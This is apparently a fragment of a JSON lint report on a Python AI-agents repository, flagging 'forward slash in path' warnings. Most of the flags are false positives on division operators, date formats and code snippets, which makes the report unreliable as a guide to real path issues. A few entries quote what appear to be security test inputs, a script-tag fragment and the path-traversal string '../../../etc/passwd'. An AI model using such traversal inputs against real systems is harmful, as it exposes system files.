        "warning": "Line 415: Forward slash in path - '(?:deliver|ship)\\s*(?:by|date)\\s*:?\\s*(\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4})'",
        "timestamp": "2025-09-05T17:30:42.343085"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 458: Forward slash in path - '\\d{1,2}[-/]\\d{1,2}.*\\$[\\d,]+(?:\\.\\d{2})?'",
        "timestamp": "2025-09-05T17:30:42.343117"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 752: Forward slash in path - ']\n        }\n        \n        document_required = required_fields.get(document_type, [])\n        \n        # Base confidence from field presence\n        field_score = 0.0\n        for field in document_required:\n            if field in data and data[field]:\n                field_score += 1.0\n        \n        # Normalize by number of required fields\n        if document_required:\n            field_confidence = field_score / len(document_required)\n        else:\n            field_confidence = 0.5  # Default for unknown types\n        \n        # Bonus for additional fields\n        bonus = min(0.2, (len(data) - len(document_required)) * 0.05)\n        \n        # Quality penalties\n        quality_penalty = 0.0\n        for value in data.values():\n            if isinstance(value, str):\n                if len(value) < 2:  # Very short values\n                    quality_penalty += 0.05\n                if re.match(r'",
        "timestamp": "2025-09-05T17:30:42.343299"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\competitive_processor.py",
        "warning": "Line 802: Forward slash in path - \"\n        # Sort methods by performance score (accuracy/cost ratio)\n        method_scores = []\n        \n        for method, perf in self.method_performance.items():\n            if perf.attempts > 0 and perf.average_cost <= budget_limit:\n                score = perf.average_accuracy / max(0.001, perf.average_cost + 0.001)  # Accuracy/cost ratio\n                method_scores.append((method, score))\n        \n        # Sort by score descending\n        method_scores.sort(key=lambda x: x[1], reverse=True)\n        \n        # Return top 3 methods\n        return [method for method, _ in method_scores[:3]]\n\n\n# Example usage and testing\nasync def main():\n    \"",
        "timestamp": "2025-09-05T17:30:42.343340"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\document_classifier.py",
        "warning": "Line 176: Forward slash in path - '] = len(numeric_words) / len(words) if words else 0\n        \n        # Keyword analysis for each document type\n        text_lower = text.lower()\n        for doc_type, signature in DocumentFeatureExtractor.DOCUMENT_SIGNATURES.items():\n            keyword_score = 0.0\n            pattern_count = 0\n            \n            # Count required keywords\n            for keyword in signature['",
        "timestamp": "2025-09-05T17:30:42.344201"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\document_classifier.py",
        "warning": "Line 202: Forward slash in path - '])\n            normalized_score = keyword_score / max_possible if max_possible > 0 else 0.0\n            \n            features['",
        "timestamp": "2025-09-05T17:30:42.344249"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\document_classifier.py",
        "warning": "Line 211: Forward slash in path - 'signature|signed|/s/'",
        "timestamp": "2025-09-05T17:30:42.344267"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\document_classifier.py",
        "warning": "Line 212: Forward slash in path - '\\d{1,2}[-/]\\d{1,2}[-/]\\d{2,4}'",
        "timestamp": "2025-09-05T17:30:42.344280"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\document_classifier.py",
        "warning": "Line 447: Forward slash in path - '] / stats['",
        "timestamp": "2025-09-05T17:30:42.344442"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\document_classifier.py",
        "warning": "Line 635: Forward slash in path - \"\n        overall_accuracy = (\n            self.correct_classifications / max(1, self.classifications_performed)\n        )\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.344620"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\multi_domain_processor.py",
        "warning": "Line 377: Forward slash in path - ', {})\n                \n                common_fields = set(data1.keys()) & set(data2.keys())\n                if common_fields:\n                    matching_fields = sum(\n                        1 for field in common_fields\n                        if str(data1[field]).lower() == str(data2[field]).lower()\n                    )\n                    agreement = matching_fields / len(common_fields)\n                    agreement_scores.append(agreement)\n        \n        return statistics.mean(agreement_scores) if agreement_scores else 0.0\n\n\nclass ResultValidator:\n    \"",
        "timestamp": "2025-09-05T17:30:42.345655"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\multi_domain_processor.py",
        "warning": "Line 698: Forward slash in path - \"\n        success_rate = self.successful_processing / max(1, self.documents_processed)\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.345933"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\multi_domain_processor.py",
        "warning": "Line 707: Forward slash in path - \": self.total_cost / max(1, self.documents_processed),\n            \"",
        "timestamp": "2025-09-05T17:30:42.345973"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 314: Forward slash in path - \"\n        overall_accuracy = (\n            self.successful_extractions / max(1, self.processed_documents)\n        )\n        \n        return {\n            \"",
        "timestamp": "2025-09-05T17:30:42.346685"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 496: Forward slash in path - \"%m/%d/%Y\"",
        "timestamp": "2025-09-05T17:30:42.346795"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 496: Forward slash in path - \"%d/%m/%Y\"",
        "timestamp": "2025-09-05T17:30:42.346809"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 496: Forward slash in path - \"%Y/%m/%d\"",
        "timestamp": "2025-09-05T17:30:42.346822"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 616: Forward slash in path - \"%m/%d/%Y\"",
        "timestamp": "2025-09-05T17:30:42.346895"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 616: Forward slash in path - \"%d/%m/%Y\"",
        "timestamp": "2025-09-05T17:30:42.346911"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 807: Forward slash in path - \"\n        try:\n            # Apply custom extraction rules\n            extracted_data = {}\n            \n            for field, rules in self.extraction_rules.items():\n                if isinstance(rules, list):  # Regex patterns\n                    for pattern in rules:\n                        match = re.search(pattern, text, re.IGNORECASE)\n                        if match:\n                            extracted_data[field] = match.group(1) if match.groups() else match.group(0)\n                            break\n                elif isinstance(rules, str):  # Single pattern\n                    match = re.search(rules, text, re.IGNORECASE)\n                    if match:\n                        extracted_data[field] = match.group(1) if match.groups() else match.group(0)\n            \n            # Calculate confidence based on fields found\n            confidence = len(extracted_data) / max(1, len(self.extraction_rules))\n            \n            custom_data = {\n                '",
        "timestamp": "2025-09-05T17:30:42.347037"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\specialized_processors.py",
        "warning": "Line 914: Forward slash in path - \"\n    Target Store #1234\n    123 Shopping Center\n    \n    Transaction Date: 01/15/2024\n    Transaction Time: 14:32\n    \n    Items:\n    Groceries              $45.67\n    Household Items        $23.45\n    \n    Subtotal:             $69.12\n    Tax:                  $5.53\n    Total:                $74.65\n    \n    VISA ****1234\n    Auth: 123456\n    \"",
        "timestamp": "2025-09-05T17:30:42.347103"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\intelligence\\system_integration.py",
        "warning": "Line 340: Forward slash in path - \": self.cost_savings / max(1, self.total_documents_processed),\n                \"",
        "timestamp": "2025-09-05T17:30:42.347862"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\adaptive_learner.py",
        "warning": "Line 204: Forward slash in path - ']) / (len(groups['",
        "timestamp": "2025-09-05T17:30:42.348421"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\adaptive_learner.py",
        "warning": "Line 238: Forward slash in path - ': 0.85},\n                        confidence=len(high_performers) / len(agent_exps),\n                        support=len(high_performers),\n                        domains=common_domains\n                    )\n                    patterns.append(pattern)\n        \n        return patterns\n    \n    async def _extract_strategy_patterns(self, experiences: List[Experience]) -> List[Pattern]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.348460"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\adaptive_learner.py",
        "warning": "Line 257: Forward slash in path - '.join(exp.actions_taken) for exp in experiences]\n            if not action_texts:\n                return patterns\n            \n            action_vectors = self.vectorizer.fit_transform(action_texts)\n            \n            # Cluster similar action patterns\n            n_clusters = min(5, len(experiences) // 3)\n            kmeans = KMeans(n_clusters=n_clusters, random_state=42)\n            clusters = kmeans.fit_predict(action_vectors.toarray())\n            \n            # Analyze each cluster\n            for cluster_id in range(n_clusters):\n                cluster_experiences = [exp for i, exp in enumerate(experiences) if clusters[i] == cluster_id]\n                \n                if len(cluster_experiences) >= self.min_support:\n                    avg_success_rate = np.mean([exp.success for exp in cluster_experiences])\n                    avg_quality = np.mean([exp.quality_score for exp in cluster_experiences])\n                    \n                    if avg_success_rate > 0.6:  # Only consider successful patterns\n                        pattern = Pattern(\n                            pattern_id=f\"",
        "timestamp": "2025-09-05T17:30:42.348489"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\adaptive_learner.py",
        "warning": "Line 329: Forward slash in path - \"\n        patterns = []\n        \n        # Analyze resource efficiency\n        efficient_experiences = []\n        for exp in experiences:\n            if exp.success and exp.execution_time > 0:\n                efficiency = exp.quality_score / exp.execution_time\n                if efficiency > 0.1:  # Threshold for efficiency\n                    efficient_experiences.append(exp)\n        \n        if len(efficient_experiences) >= self.min_support:\n            avg_resources = defaultdict(list)\n            for exp in efficient_experiences:\n                for resource, usage in exp.resources_used.items():\n                    avg_resources[resource].append(usage)\n            \n            resource_conditions = {}\n            for resource, usages in avg_resources.items():\n                if len(usages) >= self.min_support:\n                    avg_usage = np.mean(usages)\n                    resource_conditions[f\"",
        "timestamp": "2025-09-05T17:30:42.348542"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\adaptive_learner.py",
        "warning": "Line 583: Forward slash in path - ', 0.5)\n                        if abs(exp.quality_score - expected_quality) < 0.2:\n                            correct_predictions += 1\n        \n        accuracy = correct_predictions / total_predictions if total_predictions > 0 else 0.0\n        \n        # Update strategy performance\n        if strategy_id in self.learning_strategies:\n            self.learning_strategies[strategy_id].update_performance(accuracy)\n        \n        return accuracy\n    \n    async def optimize_strategies(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.348692"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\adaptive_learner.py",
        "warning": "Line 711: Forward slash in path - \"] / max(1, event[\"",
        "timestamp": "2025-09-05T17:30:42.348776"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\knowledge_transfer.py",
        "warning": "Line 28: Forward slash in path - \"\n        if not context1 or not context2:\n            return 0.0\n        \n        # Find common keys\n        common_keys = set(context1.keys()) & set(context2.keys())\n        if not common_keys:\n            return 0.0\n        \n        similarities = []\n        for key in common_keys:\n            val1 = context1[key]\n            val2 = context2[key]\n            \n            # Simple numeric similarity\n            if isinstance(val1, (int, float)) and isinstance(val2, (int, float)):\n                # Normalize difference to [0, 1] similarity\n                max_diff = max(abs(val1), abs(val2), 1.0)\n                similarity = 1.0 - abs(val1 - val2) / max_diff\n                similarities.append(similarity)\n        \n        return np.mean(similarities) if similarities else 0.0\n    \n    async def transfer_knowledge(self, \n                                source_context: Dict[str, Any],\n                                target_context: Dict[str, Any],\n                                source_strategies: Dict[str, Any]) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.349210"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\knowledge_transfer.py",
        "warning": "Line 141: Forward slash in path - ': len(successful_patterns) / len(experiences) if experiences else 0.0\n        }\n    \n    async def apply_transfer_learning(self, \n                                    source_knowledge: Dict[str, Any],\n                                    target_context: str,\n                                    strategies: Dict[str, Any] = None) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.349272"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\knowledge_transfer.py",
        "warning": "Line 170: Forward slash in path - ': len(applicable_patterns) / len(patterns) if patterns else 0.0,\n            '",
        "timestamp": "2025-09-05T17:30:42.349293"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 101: Forward slash in path - \"Learn through reward/penalty feedback\"",
        "timestamp": "2025-09-05T17:30:42.349649"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 620: Forward slash in path - \"Apply default/unknown strategy\"",
        "timestamp": "2025-09-05T17:30:42.349954"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 672: Forward slash in path - \"] = (current_perf + performance) / 2\n        \n        return await self.knowledge_transfer.transfer_knowledge(source_context, target_context, strategies)\n    \n    async def get_meta_insights(self) -> Dict[str, Any]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.350006"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 701: Forward slash in path - \": len(strategies) / max(len(self.learning_experiences), 1)\n        }\n    \n    async def _record_experience(self, experience: LearningExperience) -> None:\n        \"",
        "timestamp": "2025-09-05T17:30:42.350042"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 747: Forward slash in path - \", 0.5)\n            \n            # Simple similarity calculation\n            domain_match = 1.0 if exp_domain == current_domain else 0.5\n            complexity_match = 1.0 - abs(exp_complexity - current_complexity)\n            \n            similarity = (domain_match + complexity_match) / 2\n            \n            if similarity >= similarity_threshold:\n                similar.append(experience)\n        \n        return similar\n    \n    async def _calculate_novelty(self, context: Dict[str, Any]) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.350094"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 761: Forward slash in path - \"\n        if not self.learning_experiences:\n            return 1.0  # Everything is novel if no experience\n        \n        # Count similar experiences\n        similar_count = len(await self._find_similar_experiences(context, 0.7))\n        \n        # Novelty inversely related to similarity count\n        novelty = 1.0 / (1.0 + similar_count * 0.1)\n        \n        return novelty\n    \n    async def _get_support_examples(self, \n                                  context: Dict[str, Any],\n                                  max_examples: int) -> List[LearningExperience]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.350123"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 871: Forward slash in path - \": success_count / len(strategy_experiences),\n                    \"",
        "timestamp": "2025-09-05T17:30:42.350196"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 886: Forward slash in path - \")\n            return insights\n        \n        # Analyze success patterns\n        recent_experiences = self.learning_experiences[-20:]\n        success_rate = sum(1 for exp in recent_experiences if exp.success) / len(recent_experiences)\n        \n        if success_rate > 0.8:\n            insights.append(\"",
        "timestamp": "2025-09-05T17:30:42.350229"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 918: Forward slash in path - \"\n        \n        if len(self.learning_experiences) < 10:\n            return LearningMode.EXPLORATION\n        \n        recent_success_rate = sum(\n            1 for exp in self.learning_experiences[-10:] if exp.success\n        ) / 10\n        \n        # Check performance trend\n        improvement = await self._calculate_performance_improvement()\n        \n        if recent_success_rate < 0.4:\n            return LearningMode.ADAPTATION  # Need to adapt\n        elif improvement > 0.1:\n            return LearningMode.EXPLOITATION  # Riding a good streak\n        elif improvement < -0.1:\n            return LearningMode.EXPLORATION  # Try something new\n        elif len(set(exp.task_context.get(\"",
        "timestamp": "2025-09-05T17:30:42.350277"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\meta_learning_agent.py",
        "warning": "Line 1139: Forward slash in path - \": (\n                sum(1 for exp in self.learning_experiences[-10:] if exp.success) / \n                min(10, len(self.learning_experiences))\n            ) if self.learning_experiences else 0,\n            \"",
        "timestamp": "2025-09-05T17:30:42.350412"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\pattern_recognizer.py",
        "warning": "Line 46: Forward slash in path - ': min(len(perfs) / 10.0, 1.0)\n            }\n        \n        # Context patterns\n        if experiences and '",
        "timestamp": "2025-09-05T17:30:42.350823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\learning\\strategy_optimizer.py",
        "warning": "Line 53: Forward slash in path - \": min(len(self.strategy_performance[best_strategy]) / 10.0, 1.0) if best_strategy else 0.1\n        }\n    \n    async def get_strategy_rankings(self) -> List[Tuple[str, float]]:\n        \"",
        "timestamp": "2025-09-05T17:30:42.351175"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\agent_protocol.py",
        "warning": "Line 74: Forward slash in path - \"\n    Central message bus for agent communication\n    Supports pub/sub, request/response, and broadcast patterns\n    \"",
        "timestamp": "2025-09-05T17:30:42.351770"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\agent_protocol.py",
        "warning": "Line 175: Forward slash in path - \"Handle request/response pattern\"",
        "timestamp": "2025-09-05T17:30:42.351828"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\agent_protocol.py",
        "warning": "Line 555: Forward slash in path - \"Executing pipeline stage {stage_idx + 1}/{len(stages)}\"",
        "timestamp": "2025-09-05T17:30:42.352020"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 63: Forward slash in path - \"\n        self.total_executions += 1\n        \n        # Calculate running averages\n        alpha = 0.1  # Learning rate\n        self.success_rate = (1 - alpha) * self.success_rate + alpha * (1.0 if success else 0.0)\n        self.average_time = (1 - alpha) * self.average_time + alpha * time_taken\n        self.cost_efficiency = (1 - alpha) * self.cost_efficiency + alpha * (1.0 / cost if cost > 0 else 1.0)\n        self.quality_score = (1 - alpha) * self.quality_score + alpha * quality\n        self.last_updated = datetime.now()\n\n\n@dataclass\nclass Strategy:\n    \"",
        "timestamp": "2025-09-05T17:30:42.352385"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 90: Forward slash in path - \"])\n            score += max(0, 1.0 - complexity_diff / 5.0) * 0.3\n        \n        # Check domain match\n        if \"",
        "timestamp": "2025-09-05T17:30:42.352406"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 505: Forward slash in path - \"Get providers sorted by preference (cost/quality balance)\"",
        "timestamp": "2025-09-05T17:30:42.352669"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 508: Forward slash in path - \"]\n        ]\n        \n        # Sort by quality/cost ratio\n        return sorted(available, key=lambda p: (\n            self.providers[p][\"",
        "timestamp": "2025-09-05T17:30:42.352688"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 513: Forward slash in path - \"] / (self.providers[p][\"",
        "timestamp": "2025-09-05T17:30:42.352703"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 897: Forward slash in path - \", 10)\n        if estimated_time > 0:\n            efficiency_bonus = min(estimated_time / 20.0, 1.0) * quality_factors[\"",
        "timestamp": "2025-09-05T17:30:42.352958"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 1059: Forward slash in path - \"] / config[\"",
        "timestamp": "2025-09-05T17:30:42.353080"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 1075: Forward slash in path - \"] / config[\"",
        "timestamp": "2025-09-05T17:30:42.353118"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 1116: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.353168"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\enhanced_meta_orchestrator.py",
        "warning": "Line 1117: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.353197"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\meta_orchestrator.py",
        "warning": "Line 476: Forward slash in path - \"C:/Users/Nouri/Documents/GitHub/ai-agents/knowledge/meta_knowledge.json\"",
        "timestamp": "2025-09-05T17:30:42.353750"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\meta_orchestrator.py",
        "warning": "Line 509: Forward slash in path - \")) / len(entries) * 100 if entries else 0\n            report.append(f\"",
        "timestamp": "2025-09-05T17:30:42.353788"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 67: Forward slash in path - \", False))\n        return (successful / len(self.task_history)) * 100\n    \n    def _calculate_avg_time(self) -> float:\n        \"",
        "timestamp": "2025-09-05T17:30:42.354160"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 74: Forward slash in path - \", 0) for task in self.task_history]\n        return sum(times) / len(times) if times else 0.0\n\n\nclass ArchitectAgent(BaseSpecializedAgent):\n    \"",
        "timestamp": "2025-09-05T17:30:42.354172"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 289: Forward slash in path - \"/api/{interface_name}/{method}\"",
        "timestamp": "2025-09-05T17:30:42.354289"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 722: Forward slash in path - \"/{feature.replace(\"",
        "timestamp": "2025-09-05T17:30:42.354494"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 730: Forward slash in path - \"/{feature.replace(\"",
        "timestamp": "2025-09-05T17:30:42.354515"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 730: Forward slash in path - \")}/metrics\"",
        "timestamp": "2025-09-05T17:30:42.354532"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1210: Forward slash in path - \"\n        def decorator(func: Callable) -> Callable:\n            @functools.wraps(func)\n            async def wrapper(*args, **kwargs):\n                import psutil\n                import os\n                \n                process = psutil.Process(os.getpid())\n                initial_memory = process.memory_info().rss / 1024 / 1024\n                \n                result = await func(*args, **kwargs)\n                \n                current_memory = process.memory_info().rss / 1024 / 1024\n                memory_used = current_memory - initial_memory\n                \n                if memory_used > max_memory_mb:\n                    # Force garbage collection\n                    gc.collect()\n                    # Log warning\n                    print(f\"",
        "timestamp": "2025-09-05T17:30:42.354782"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1304: Forward slash in path - \")\n        \n        # Analyze for I/O bottlenecks\n        if code_stats.get(\"",
        "timestamp": "2025-09-05T17:30:42.354848"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1308: Forward slash in path - \"Synchronous I/O in async context - use async I/O operations\"",
        "timestamp": "2025-09-05T17:30:42.354877"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1310: Forward slash in path - \"Unbuffered I/O detected - consider buffering\"",
        "timestamp": "2025-09-05T17:30:42.354906"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1577: Forward slash in path - ')</script>\"",
        "timestamp": "2025-09-05T17:30:42.355052"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1579: Forward slash in path - \"../../../etc/passwd\"",
        "timestamp": "2025-09-05T17:30:42.355085"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1602: Forward slash in path - \"../\"",
        "timestamp": "2025-09-05T17:30:42.355128"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\agents\\meta\\specialized_agents.py",
        "warning": "Line 1638: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.355205"
      },
      {
        "category": "WINDOWS_COMPAT",
